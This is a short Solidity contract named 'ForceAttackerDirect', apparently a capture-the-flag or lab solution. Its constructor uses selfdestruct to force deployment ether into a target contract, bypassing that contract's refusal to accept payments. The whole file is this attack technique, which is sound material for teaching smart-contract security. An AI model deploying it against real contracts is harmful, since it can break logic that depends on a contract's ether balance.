// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract ForceAttackerDirect {
    constructor(address payable _target) payable {
        require(msg.value > 0, "Insufficient deployment ether");
        selfdestruct(_target);
    }
}